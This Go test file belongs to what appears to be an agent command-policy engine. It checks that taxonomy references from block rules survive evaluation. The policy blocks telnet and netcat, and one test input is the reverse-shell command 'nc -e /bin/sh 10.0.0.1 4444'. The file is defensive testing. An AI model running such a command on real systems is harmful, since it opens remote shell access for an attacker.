package policy

import (
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/normalize"
)

// Issue #3111: the taxonomy ref is the first hop of
// block -> taxonomy node -> compliance control -> attestation receipt.
// Before this change, Rule.Taxonomy and Finding.TaxonomyRef existed but were
// dropped by EvalResult, so the audit event never saw them. These tests pin
// both evaluation paths — the analyzer pipeline and the regex fallback — so a
// future refactor of either can't quietly sever the chain again.

const taxTelnet = "data-exfiltration/network-egress/reverse-shell"

func taxonomyTestPolicy() *Policy {
	return &Policy{
		Version:  "0.1",
		Defaults: Defaults{Decision: DecisionAudit},
		Rules: []Rule{
			{
				ID:       "tax-block-telnet",
				Taxonomy: taxTelnet,
				Match:    Match{CommandPrefix: []string{"telnet "}},
				Decision: DecisionBlock,
				Reason:   "Plaintext telnet to internal host",
			},
			{
				// Same decision severity, different taxonomy node — a
				// multi-rule trigger must surface both refs, not just the
				// first.
				ID:       "tax-block-telnet-lan",
				Taxonomy: "reconnaissance/network-discovery/internal-host-probe",
				Match:    Match{CommandRegex: `telnet\s+\S+\.lan\b`},
				Decision: DecisionBlock,
				Reason:   "Probe of an internal .lan host",
			},
			{
				// No taxonomy — must contribute nothing rather than an empty
				// string, so the receiver never sees an unresolvable ref.
				ID:       "tax-block-telnet-untagged",
				Match:    Match{CommandRegex: `telnet\s+\S+\s+23\b`},
				Decision: DecisionBlock,
				Reason:   "Telnet on the default port",
			},
		},
	}
}

func TestEvaluate_PipelinePathCarriesTaxonomyRefs(t *testing.T) {
	engine, err := NewEngineWithAnalyzers(taxonomyTestPolicy(), 2)
	if err != nil {
		t.Fatalf("NewEngineWithAnalyzers: %v", err)
	}

	cmd := "telnet legacy-router.lan 23"
	normalized := normalize.NormalizeCommand(cmd, "")
	result := engine.EvaluateWithParsed(cmd, normalized.Paths, normalized.Parsed)

	if result.Decision != DecisionBlock {
		t.Fatalf("Decision = %v; want BLOCK", result.Decision)
	}
	assertTaxonomySet(t, result.TaxonomyRefs,
		taxTelnet,
		"reconnaissance/network-discovery/internal-host-probe",
	)
}

func TestEvaluate_RegexFallbackPathCarriesTaxonomyRefs(t *testing.T) {
	// NewEngine (no analyzer registry) exercises the built-in regex-only
	// fallback branch, which builds its own best-rule set.
	engine, err := NewEngine(taxonomyTestPolicy())
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}

	result := engine.Evaluate("telnet legacy-router.lan 23", nil)
	if result.Decision != DecisionBlock {
		t.Fatalf("Decision = %v; want BLOCK", result.Decision)
	}
	assertTaxonomySet(t, result.TaxonomyRefs,
		taxTelnet,
		"reconnaissance/network-discovery/internal-host-probe",
	)
}

// TestEvaluate_NoTaxonomyYieldsEmptyNotPlaceholder — a rule without a taxonomy
// must produce an empty ref list, never a "" entry. An unresolvable ref in an
// attestation is worse than an absent one.
func TestEvaluate_NoTaxonomyYieldsEmptyNotPlaceholder(t *testing.T) {
	pol := &Policy{
		Version:  "0.1",
		Defaults: Defaults{Decision: DecisionAudit},
		Rules: []Rule{{
			ID:       "tax-untagged-only",
			Match:    Match{CommandPrefix: []string{"nc "}},
			Decision: DecisionBlock,
			Reason:   "netcat",
		}},
	}
	engine, err := NewEngineWithAnalyzers(pol, 2)
	if err != nil {
		t.Fatalf("NewEngineWithAnalyzers: %v", err)
	}

	normalized := normalize.NormalizeCommand("nc -e /bin/sh 10.0.0.1 4444", "")
	result := engine.EvaluateWithParsed("nc -e /bin/sh 10.0.0.1 4444", normalized.Paths, normalized.Parsed)

	for _, ref := range result.TaxonomyRefs {
		if ref == "" {
			t.Fatalf("TaxonomyRefs contains an empty placeholder: %v", result.TaxonomyRefs)
		}
	}
}

func assertTaxonomySet(t *testing.T, got []string, want ...string) {
	t.Helper()
	seen := map[string]bool{}
	for _, g := range got {
		if g == "" {
			t.Errorf("TaxonomyRefs contains an empty placeholder: %v", got)
		}
		if seen[g] {
			t.Errorf("TaxonomyRefs contains a duplicate %q: %v", g, got)
		}
		seen[g] = true
	}
	for _, w := range want {
		if !seen[w] {
			t.Errorf("TaxonomyRefs = %v; missing %q — a rule that fired did not "+
				"contribute its taxonomy node, so that half of the decision can "+
				"never be resolved to a compliance control", got, w)
		}
	}
}
